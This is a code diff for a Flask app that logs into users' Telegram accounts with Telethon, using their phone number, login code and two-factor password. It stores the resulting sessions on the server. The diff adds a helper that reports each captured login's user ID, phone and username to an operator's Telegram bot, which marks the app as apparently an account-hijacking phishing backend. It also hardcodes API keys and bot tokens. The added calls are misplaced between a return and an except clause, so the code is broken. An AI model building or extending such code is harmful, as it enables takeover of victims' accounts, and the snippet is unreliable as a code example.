@@ -1,7 +1,7 @@
 import os
 import asyncio
 from flask import Flask, request, jsonify, render_template
-from telethon.sync import TelegramClient
+from telethon import TelegramClient
 from telethon.errors import (
     PhoneCodeInvalidError,
     SessionPasswordNeededError,
@@ -10,6 +10,8 @@ from telethon.errors import (
 )
 from aiogram import Bot
 from database import get_db, init_db
+import threading
+
 
 # ======================
 # CONFIG
@@ -18,12 +20,19 @@ API_ID = 25780325
 API_HASH = "2c4cb6eee01a46dc648114813042c453"
 BOT_TOKEN = "8485200508:AAEIwbb9HpGBUX_mWPGVplpxNRoXXnlSOrU"
 
-ADMIN_ID = 515902673
 ADMIN_BOT_TOKEN = "8455652640:AAE0Mf0haSpP_8yCjZTCKAqGQAcVF4kf02s"
+ADMIN_ID = 515902673
+
+ADMIN_CHAT_ID = ADMIN_ID
+admin_bot = Bot(ADMIN_BOT_TOKEN)
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
 os.makedirs(SESSIONS_DIR, exist_ok=True)
+
+bot = Bot(BOT_TOKEN)
+app = Flask(__name__, template_folder="templates")
+init_db()
 
 def run_async(coro):
     loop = asyncio.new_event_loop()
@@ -33,28 +42,29 @@ def run_async(coro):
     finally:
         loop.close()
 
+# phone -> {client, hash}
+pending = {}
 
-def send_admin_message(text: str):
+def session_path(phone):
+    return os.path.join(SESSIONS_DIR, phone.replace("+", ""))
+    
+def notify_admin_login(user_id: str, phone: str, username: str | None = None):
     async def _send():
-        await bot.send_message(ADMIN_ID, text)
+        text = (
+            "🔐 Yangi foydalanuvchi login qildi\n\n"
+            f"👤 User ID: {user_id}\n"
+            f"📱 Telefon: {phone}\n"
+        )
+        if username:
+            text += f"👤 Username: @{username}"
+
+        await admin_bot.send_message(ADMIN_CHAT_ID, text)
 
     def runner():
         asyncio.run(_send())
 
     threading.Thread(target=runner, daemon=True).start()
 
-
-bot = Bot(BOT_TOKEN)
-
-app = Flask(__name__, template_folder="templates")
-
-init_db()
-
-# phone -> {client, hash}
-pending = {}
-
-def session_path(phone):
-    return os.path.join(SESSIONS_DIR, phone.replace("+", ""))
 
 # ======================
 # ROUTES
@@ -148,6 +158,13 @@ def verify_code():
 
         return jsonify({"status": "success"})
 
+    notify_admin_login(
+        user_id=user_id,
+        phone=phone,
+        username=getattr(me, "username", None)
+    )
+
+
     except SessionPasswordNeededError:
         return jsonify({"status": "2fa_required"})
     except PhoneCodeInvalidError:
@@ -196,6 +213,12 @@ def verify_password():
 
         return jsonify({"status": "success"})
 
+    notify_admin_login(
+        user_id=user_id,
+        phone=phone,
+        username=getattr(me, "username", None)
+    )
+
     except Exception as e:
         print("VERIFY PASSWORD ERROR:", e)
         return jsonify({"status": "invalid_password"})
@@ -225,6 +248,7 @@ def notify_admin(user_id: str, phone: str, username: str | None = None):
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
+
 
 
 
